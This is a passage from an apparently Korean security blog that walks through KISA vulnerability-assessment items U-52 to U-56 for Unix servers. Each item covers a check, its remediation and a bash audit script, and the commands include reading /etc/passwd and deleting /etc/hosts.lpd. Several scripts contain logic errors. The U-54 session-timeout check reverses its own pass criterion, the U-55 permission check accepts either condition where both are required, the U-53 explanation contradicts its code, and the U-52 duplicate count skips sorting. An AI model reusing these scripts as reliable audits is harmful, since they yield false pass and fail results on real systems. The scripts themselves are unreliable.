<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 동일한 <code>UID</code>로 설정된 사용자 계정이 존재하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 동일한 <code>UID</code>로 설정된 사용자 계정이 존재하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># cat /etc/passwd</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd | cut -f 3 -d &#39;:&#39;</p>
</blockquote>
<br>

<p><code>:</code> 기준으로 잘라서 <code>UID</code>만 출력해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-51/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX</td>
<td><code>usermod</code> 명령으로 동일한 <code>UID</code>로 설정된 사용자 계정의 <code>UID</code> 변경<br />    <code># usermod -u &lt;변경할 UID값&gt; &lt;user_name&gt;</code></td>
</tr>
<tr>
<td>AIX</td>
<td><code>chuser</code> 명령으로 동일한 <code>UID</code>로 설정된 사용자 계정의 <code>UID</code> 변경<br />    <code># chuser id=&lt;변경할 UID값&gt; &lt;user_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | cut -f 3 -d <span class="string">&#x27;:&#x27;</span> | uniq -c | cut -c 7-8 | sort -u | grep -v <span class="string">&quot;1&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-52 [동일한 UID 금지] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-52.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>:</code> 기준으로 자르고 중복된 횟수를 찾고 1을 제외한 값이 있을 때 <code>취약</code>, 아니면 <code>양호</code> 처리했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-52</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-52/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-53 사용자 shell 점검</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-53%20%EC%82%AC%EC%9A%A9%EC%9E%90%20shell%20%EC%A0%90%EA%B2%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>로그인이 불필요한 계정에 쉘 부여 여부 점검입니다.</p>
<p>항목코드는 <code>U-53</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>로그인이 불필요한 계정에 쉘 설정을 제거하여 로그인이 필요하지 않은 계정을 통한 시스템 명령어를 실행하지 못하게 하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>로그인이 불필요한 계정은 일반적으로 OS 설치 시 기본적으로 생성되는 계정으로 쉘이 설정되어 있을 경우 공격자는 기본 계정들을 이용하여 시스템에 명령어를 실행할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 로그인이 필요하지 않은 계정에 <code>/bin/false(/sbin/nologin)</code> 쉘이 부여되어  있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 로그인이 필요하지 않은 계정에 <code>/bin/false(/sbin/nologin)</code> 쉘이 부여되지  않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># cat /etc/passwd | egrep &quot;^daemon|^bin|^sys|^adm|^listen|^nobody|^nobody4|^noaccess|^diag|^operator|^games|^gopher&quot; | grep -v &quot;admin&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd | egrep &quot;^daemon|^bin|^sys|^adm|^listen|^nobody|^nobody4|^noaccess|^diag|^operator|^games|^gopher&quot; | grep -v &quot;admin&quot;</p>
</blockquote>
<br>

<p><code>nologin</code> 쉘이 부여되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-53/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/passwd</code> 파일 열기<br /><br />2) 로그인 쉘 부분인 계정 맨 마지막에 <code>/bin/false(/sbin/nologin)</code> 부여 및 변경</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | egrep <span class="string">&quot;^daemon|^bin|^sys|^adm|^listen|^nobody|^nobody4|^noaccess|^diag|^operator|^games|^gopher&quot;</span> | grep -v <span class="string">&quot;admin&quot;</span> | grep -v <span class="string">&quot;nologin&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-53 [사용자 shell 점검] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-53.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>nologin</code> 쉘이 부여된 계정이 있을 때 <code>취약</code>, 아니면 <code>양호</code> 처리했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-53</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-53/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-54 Session Timeout 설정</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-54%20Session%20Timeout%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>사용자 쉘에 대한 환경설정 파일에서 <code>session timeout</code> 설정 여부 점검입니다.</p>
<p>항목코드는 <code>U-54</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>사용자의 고의 또는 실수로 시스템에 계정이 접속된 상태로 방치됨을 차단하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>Session timeout</code> 값이 설정되지 않은 경우 유휴 시간 내 비인가자의 시스템 접근으로 인해 불필요한 내부 정보의 노출 위함이 존재합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>Session Timeout</code>이 600초(10분) 이하로 설정되어 있는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>Session Timeout</code>이 600초(10분) 이하로 설정되지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td>&lt;sh, ksh, bash 사용 시&gt;<br />    <code># cat /etc/profile(.profile)</code><br />    TMOUT=600<br />    export TMOUT<br /><br />&lt;csh 사용 시&gt;<br />    <code># cat /etc/csh.login</code> 또는 <code># cat /etc/csh.cshrc</code><br />    set autologout=10</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/profile | grep &quot;TMOUT&quot;</p>
</blockquote>
<br>

<p><code>Session Timeout</code> 설정되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-54/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td>- sh, ksh, bash를 사용하는 경우<br />1) vi 편집기를 이용하여 <code>/etc/profile(.profile)</code> 파일 열기<br />2) 아래와 같이 수정 또는 추가<br />    <code>TMOUT=600</code><br />    <code>export TMOUT</code><br /><br />- csh를 사용하는 경우<br />1) vi 편집기를 이용하여 <code>/etc/csh.login</code> 또는 <code>/etc/csh.cshrc</code> 파일 열기<br />2) 아래와 같이 수정 또는 추가<br />    <code>set autologout=10</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/profile | grep <span class="string">&quot;TMOUT&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process=`cat /etc/profile | grep <span class="string">&quot;TMOUT&quot;</span> | sed <span class="string">&#x27;s/[^0-9]//g&#x27;</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> -lt 600 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-54 [Session Timeout 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-54.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Session Timeout</code>이 설정 안되거나 600 이하라면 <code>취약</code>, 아니면 <code>양호</code> 처리했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-54</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-54/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-55 hosts.lpd 파일 소유자 및 권한 설정</title>
    <url>/2022/01/20/2022-01-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-55%20hosts.lpd%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/hosts.lpd</code> 파일의 삭제 및 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-55</code>이며, 항목 주요도는 <code>하</code>입니다.</p>
<br>

<br>

<h2 id="hosts-lpd"><a href="#hosts-lpd" class="headerlink" title="hosts.lpd ?"></a>hosts.lpd ?</h2><br>

<p>로컬 프린트 서비스를 사용할 수 있는 허가된 호스트 정보를 담고 있는 파일입니다. (hostname 또는 IP 주소를 포함하고 있음)</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비인가자의 임의적인 <code>hosts.lpd</code> 변조를 막기 위해 <code>hosts.lpd</code> 파일 삭제 또는  소유자 및 권한 관리를 해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p><code>hosts.lpd</code> 파일의 접근 권한이 적절하지 않을 경우 비인가자가 <code>/etc/hosts.lpd</code>  파일을 수정하여 허용된 사용자의 서비스를 방해할 수 있으며, 호스트 정보를 획득 할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>hosts.lpd</code> 파일이 삭제되어 있거나 불가피하게 <code>hosts.lpd</code> 파일을 사용할  시 파일의 소유자가 root이고 권한이 600인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>hosts.lpd</code> 파일이 삭제되어 있지 않거나 파일의 소유자가 root가 아니고  권한이 600이 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># ls -l /etc/hosts.lpd</code><br />    rw——- root &lt;hosts.lpd 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/hosts.lpd</p>
</blockquote>
<br>

<p><code>hosts.lpd</code> 파일이 존재하는지, 존재할 경우 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-55/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td>1) <code>hosts.lpd</code> 파일 삭제<br />    <code># rm -rf /etc/hosts.lpd</code><br /><br />2) 파일의 퍼미션 변경 (<code>hosts.lpd</code> 파일이 필요시)<br />    <code># chmod 600 /etc/hosts.lpd</code><br /><br />3) 소유자를 root로 변경 (<code>hosts.lpd</code> 파일이 필요시)<br />    <code># chown root /etc/hosts.lpd</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find / -name hosts.lpd`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        process=`find / -name hosts.lpd -perm 600`</span><br><span class="line">        process2=`find /etc/hosts.lpd -user root`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] || [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                ProcessResult=양호</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ProcessResult=취약</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-55 [hosts.lpd 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-55.txt</span><br></pre></td></tr></table></figure>

<br>

<p>중첩 if문을 사용하여 <code>hosts.lpd</code> 파일이 있다면 소유자와 권한을 확인해주고 <code>hosts.lpd</code> 파일이 없다면 <code>양호</code>처리했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-55</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-55/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-56 UMASK 설정 관리</title>
    <url>/2022/01/21/2022-01-21-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-56%20UMASK%20%EC%84%A4%EC%A0%95%20%EA%B4%80%EB%A6%AC/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템 <code>UMASK</code> 값이 022 이상 인지에 대한 점검입니다.</p>
<p>항목코드는 <code>U-56</code>이며, 항목 주요도는 <code>중</code>입니다.</p>
<br>

<br>

<h2 id="UMASK"><a href="#UMASK" class="headerlink" title="UMASK ?"></a>UMASK ?</h2><br>

<p>파일 및 디렉터리 생성 시 기본 퍼미션을 지정해 주는 명령어입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>잘못 설정된 <code>UMASK</code> 값으로 인해 신규 파일에 대한 과도한 권한이 부여되는 것을 방지하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>잘못된 <code>UMASK</code> 값으로 인해 파일 및 디렉터리 생성시 과도하게 퍼미션이 부여될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>UMASK</code> 값이 022 이상으로 설정된 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>UMASK</code> 값이 022 이상으로 설정되지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, HP-UX,<br />AIX</td>
<td><code># vi /etc/profile</code><br />    UMASK=022</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/profile | grep &quot;umask&quot;</p>
</blockquote>
<br>

<p><code>/etc/profile</code>에서 umask 값을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-56/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><strong>방법-1</strong> <code>/etc/profile</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/profile</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    umask 022<br />    export umask<br /><br /><strong>방법-2</strong> <code>/etc/default/login</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/default/login</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>#UMASK=022</code><br />    (수정 후) <code>UMASK=022</code></td>
</tr>
<tr>
<td>LINUX</td>
<td>1) vi 편집기를 이용하여 <code>/etc/profile</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    umask 022<br />    export umask</td>
</tr>
<tr>
<td>HP-UX</td>
<td><strong>방법-1</strong> <code>/etc/profile</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/profile</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    umask 022<br />    export umask<br /><br /><strong>방법-2</strong> <code>/etc/default/security</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/default/security</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>#UMASK=022</code><br />    (수정 후) <code>UMASK=022</code></td>
</tr>
<tr>
<td>AIX</td>
<td><strong>방법-1</strong> <code>/etc/profile</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/profile</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    umask 022<br />    export umask<br /><br /><strong>방법-2</strong> <code>/etc/security/user</code> 파일을 이용한 <code>UMASK</code> 설정 변경<br />1) vi 편집기를 이용하여 <code>/etc/security/user</code> 파일 열기<br /><br />2) 아래와 같이 수정 또는 신규 삽입<br />    (수정 전) <code>UMASK=</code><br />    (수정 후) <code>UMASK=022</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

